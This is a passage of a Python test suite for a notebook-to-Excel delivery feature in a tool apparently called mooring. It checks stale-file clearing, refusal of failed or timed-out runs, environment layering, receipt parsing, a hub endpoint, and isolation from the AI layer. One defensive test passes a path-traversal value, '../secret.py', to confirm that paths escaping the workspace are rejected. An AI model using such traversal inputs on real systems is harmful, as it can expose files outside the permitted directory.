        deliver.deliver_excel(cfg, "sales.py")
    assert "mooring_deliver" in str(excinfo.value)


def test_a_stale_workbook_is_removed_before_the_run(tmp_path, monkeypatch):
    # The pre-run clear, tested WITHOUT the runtime's own reset() masking it: a kernel
    # that writes nothing must not leave yesterday's file to be reported as today's.
    cfg, ws = _mk(tmp_path, "sales.py")
    stale = deliver.outbox_target(ws, "sales.py", ext=".xlsx")
    stale.parent.mkdir(parents=True, exist_ok=True)
    stale.write_bytes(b"yesterday")
    monkeypatch.setattr(notebook_run, "_exec", _kernel([], reset=False))

    with pytest.raises(deliver.DeliverError):
        deliver.deliver_excel(cfg, "sales.py")
    assert not stale.exists()


def test_a_stale_receipt_is_cleared_before_the_run(tmp_path, monkeypatch):
    # Without the pre-run clear, a run that records nothing reports the PREVIOUS run's
    # sheets — the receipt is how mooring knows what happened, so it must be this run's.
    cfg, ws = _mk(tmp_path, "sales.py")
    workbook.workbooks_dir(ws).mkdir(parents=True, exist_ok=True)
    (workbook.workbooks_dir(ws) / "sales.py.json").write_text(
        json.dumps(
            {
                "notebook": "sales.py",
                "workbook": ".mooring/outbox/sales/sales-20260101.xlsx",
                "sheets": ["Yesterday"],
                "failures": [],
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setattr(notebook_run, "_exec", _kernel([], reset=False))

    with pytest.raises(deliver.DeliverError):
        deliver.deliver_excel(cfg, "sales.py")
    assert workbook.read_receipt(ws, "sales.py") == {}


def test_deliver_excel_refuses_a_run_with_a_failed_cell(tmp_path, monkeypatch):
    # A failed cell means the numbers may be wrong, and a wrong workbook forwarded to a
    # stakeholder is the worst outcome this feature has.
    cfg, ws = _mk(tmp_path, "sales.py")
    stderr = "MarimoExceptionRaisedError: division by zero\n"
    monkeypatch.setattr(
        notebook_run, "_exec", _kernel([("Summary", {"n": [1]})], returncode=1, stderr=stderr)
    )

    with pytest.raises(deliver.DeliverError) as excinfo:
        deliver.deliver_excel(cfg, "sales.py")
    assert "1 cell failed" in str(excinfo.value)
    # The cells that DID run wrote their sheets. A workbook mooring refused must leave
    # nothing behind: half the numbers looks exactly like all of them once forwarded.
    assert not deliver.outbox_target(ws, "sales.py", ext=".xlsx").exists()


def test_a_run_that_could_not_finish_leaves_no_partial_workbook(tmp_path, monkeypatch):
    # A timeout kills the kernel mid-notebook, after the sheets it got to are on disk.
    cfg, ws = _mk(tmp_path, "sales.py")

    def _timeout(cmd, cwd, env, timeout):
        _kernel([("Summary", {"n": [1]})])(cmd, cwd, env, timeout)
        raise subprocess.TimeoutExpired(cmd, 1)

    monkeypatch.setattr(notebook_run, "_exec", _timeout)

    with pytest.raises(deliver.DeliverError):
        deliver.deliver_excel(cfg, "sales.py")
    assert not deliver.outbox_target(ws, "sales.py", ext=".xlsx").exists()


def test_deliver_excel_blames_the_environment_when_the_notebook_never_ran(tmp_path, monkeypatch):
    cfg, ws = _mk(tmp_path, "sales.py")
    monkeypatch.setattr(notebook_run, "_exec", _kernel([], returncode=1, produce=False))

    with pytest.raises(deliver.DeliverError) as excinfo:
        deliver.deliver_excel(cfg, "sales.py")
    assert "dependencies" in str(excinfo.value)


def test_deliver_excel_refuses_a_plain_module(tmp_path):
    cfg = _cfg(tmp_path)
    ws = cfg.workspace()
    ws.mkdir(parents=True)
    (ws / "helpers.py").write_text("def f():\n    return 1\n", encoding="utf-8")
    with pytest.raises(deliver.DeliverError):
        deliver.deliver_excel(cfg, "helpers.py")


def test_deliver_excel_rejects_a_path_escaping_the_workspace(tmp_path):
    cfg = _cfg(tmp_path)
    cfg.workspace().mkdir(parents=True)
    with pytest.raises(ValueError):
        deliver.deliver_excel(cfg, "../secret.py")


# -- the one channel from mooring INTO the kernel --------------------------------


def test_env_extra_layers_over_the_launch_environment(tmp_path, monkeypatch):
    # Replacing the environment instead of layering onto it strips PATH/PYTHONPATH — the
    # bridge the frozen build depends on — and breaks the marimo subprocess in production
    # while every test that fakes _exec stays green.
    cfg, ws = _mk(tmp_path, "sales.py")
    seen = {}

    def _capture(cmd, cwd, env, timeout):
        seen.update(env or {})
        return _kernel([("Summary", {"n": [1]})])(cmd, cwd, env, timeout)

    monkeypatch.setenv("MOORING_TEST_LAUNCH_MARKER", "kept")
    monkeypatch.setattr(notebook_run, "_exec", _capture)

    deliver.deliver_excel(cfg, "sales.py")

    assert seen[workbook.ENV_TARGET].endswith(".xlsx")
    assert seen[workbook.ENV_NOTEBOOK] == "sales.py"
    assert seen.get("MOORING_TEST_LAUNCH_MARKER") == "kept"
    assert len(seen) > 2  # the whole launch environment, not just our two additions


def test_a_run_without_env_extra_is_unchanged(tmp_path, monkeypatch):
    # Verify and the scheduled refresh call the same runner and must be untouched by
    # this feature: no env_extra, no substituted environment.
    from mooring.app import verify_run

    cfg, ws = _mk(tmp_path, "sales.py")
    seen = {}

    def _capture(cmd, cwd, env, timeout):
        seen["env"] = env
        out = _out_of(cmd)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text("<html></html>", encoding="utf-8")
        return subprocess.CompletedProcess(cmd, 0, "", "")

    monkeypatch.setattr(notebook_run, "_exec", _capture)
    verify_run.verify_notebook(cfg, "sales.py")

    passed = seen["env"] or {}
    assert not any(key.startswith("MOORING_DELIVER_") for key in passed)


# -- the receipt mooring reads back ----------------------------------------------


def test_read_receipt_is_empty_for_a_missing_corrupt_or_foreign_receipt(tmp_path):
    ws = tmp_path / "ws"
    directory = workbook.workbooks_dir(ws)
    directory.mkdir(parents=True)
    assert workbook.read_receipt(ws, "sales.py") == {}

    (directory / "sales.py.json").write_text("{not json", encoding="utf-8")
    assert workbook.read_receipt(ws, "sales.py") == {}

    # A receipt naming a different notebook is never surfaced under this one.
    (directory / "sales.py.json").write_text(
        json.dumps({"notebook": "other.py", "sheets": ["Summary"]}), encoding="utf-8"
    )
    assert workbook.read_receipt(ws, "sales.py") == {}


def test_a_malformed_failure_entry_still_counts_as_a_failure(tmp_path):
    # Dropping an unreadable failure entry would turn "a table was lost" into "all good",
    # which is the one direction this record must never fail in.
    ws = tmp_path / "ws"
    directory = workbook.workbooks_dir(ws)
    directory.mkdir(parents=True)
    (directory / "sales.py.json").write_text(
        json.dumps({"notebook": "sales.py", "failures": ["oops", {"sheet": "Detail"}]}),
        encoding="utf-8",
    )
    failures = workbook.read_receipt(ws, "sales.py")["failures"]
    assert len(failures) == 2 and failures[1]["sheet"] == "Detail"


def test_receipt_slug_is_injective(tmp_path):
    # a/b.py and a__b.py must not collide on one receipt.
    assert workbook.slug("a/b.py") != workbook.slug("a__b.py")


# -- the hub endpoint -------------------------------------------------------------


def _hub(tmp_path, monkeypatch):
    from mooring import config, paths
    from mooring.hub.server import Hub

    monkeypatch.setattr(paths, "user_config_dir", lambda: tmp_path / "appdata")
    monkeypatch.delenv("MOORING_TOKEN", raising=False)
    ws = tmp_path / "ws"
    ws.mkdir()
    spec = config.RepoSpec(alias="ws", owner="", repo="", workspace_path=str(ws))
    return Hub(config.AppConfig(repos=(spec,), active_alias="ws")), ws


def test_api_deliver_excel_reports_the_workbook_and_its_sheets(tmp_path, monkeypatch):
    from starlette.testclient import TestClient

    from mooring import reveal
    from mooring.hub.server import create_app

    hub, ws = _hub(tmp_path, monkeypatch)
    (ws / "sales.py").write_text(NOTEBOOK, encoding="utf-8")
    out = ws / ".mooring" / "outbox" / "sales" / "sales-20260731.xlsx"
    out.parent.mkdir(parents=True)
    out.write_bytes(b"workbook")

    def _fake(cfg, rel):
        return deliver.DeliverResult(
            notebook_rel=rel,
            out_path=out,
            out_rel=out.relative_to(ws).as_posix(),
            commit="abc1234",
            sheets=("Summary", "By region"),
        )

    monkeypatch.setattr(deliver, "deliver_excel", _fake)
    monkeypatch.setattr(reveal, "reveal", lambda p: None)  # no real Explorer window

    with TestClient(create_app(hub)) as client:
        resp = client.post("/api/deliver/excel", json={"path": "sales.py"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["out"].startswith(".mooring/outbox/")
    assert body["sheets"] == ["Summary", "By region"]
    assert any("Delivered" in line for line in body["lines"])


def test_api_deliver_excel_surfaces_the_reason_it_could_not(tmp_path, monkeypatch):
    from starlette.testclient import TestClient

    from mooring.hub.server import create_app

    hub, ws = _hub(tmp_path, monkeypatch)
    (ws / "sales.py").write_text(NOTEBOOK, encoding="utf-8")

    def _boom(cfg, rel):
        raise deliver.DeliverError("no Excel writer: mooring deps add openpyxl")

    monkeypatch.setattr(deliver, "deliver_excel", _boom)
    with TestClient(create_app(hub)) as client:
        resp = client.post("/api/deliver/excel", json={"path": "sales.py"})
    assert resp.status_code == 502
    assert "mooring deps add openpyxl" in resp.json()["error"]


# -- no channel to the AI ---------------------------------------------------------


def test_the_feature_has_no_import_path_to_ai(tmp_path):
    # Structural, not a promise: the workbook holds real values, so nothing in this
    # feature may reach the AI layer. The import-linter's frozen-core-is-lean contract
    # enforces the same for marimo/Copilot/spaCy — this pins the ai/ edge here.
    for name in ("workbook.py", "_workbook_runtime.py"):
        src = (Path(workbook.__file__).with_name(name)).read_bytes()
        tree = ast.parse(src.decode("utf-8"))
        modules = {
            alias.name
            for node in ast.walk(tree)
            if isinstance(node, ast.Import)
            for alias in node.names
        }
        modules |= {
            node.module
            for node in ast.walk(tree)
            if isinstance(node, ast.ImportFrom) and node.module
        }
        assert not any(m.startswith("mooring.ai") for m in modules)
    # The lean-leaf contract must list it, or a future edit could quietly pull marimo in.
    contract = (Path(workbook.__file__).parents[2] / ".importlinter").read_text("utf-8")
    assert "mooring.workbook" in contract


def test_the_copilot_guide_is_value_free_api_text_only():
    guide = workbook.copilot_guide()
    assert "mooring_deliver" in guide and "md.table" in guide
    assert "never request data values" in guide
    # It describes the API; it must not carry a path, a value, or a receipt.
    assert ".mooring/" not in guide


def test_build_system_context_folds_in_the_workbook_help():
    from mooring.ai import egress

    guide = workbook.copilot_guide()
    ctx = egress.build_system_context(
        schema_text="a: Int64",
        notebook_source="import marimo",
        notebook_rel="nb.py",
        workbook_help=guide,
    )
    assert guide in ctx
    without = egress.build_system_context(
        schema_text="a: Int64", notebook_source="import marimo", notebook_rel="nb.py"
    )
    assert "mooring_deliver" not in without
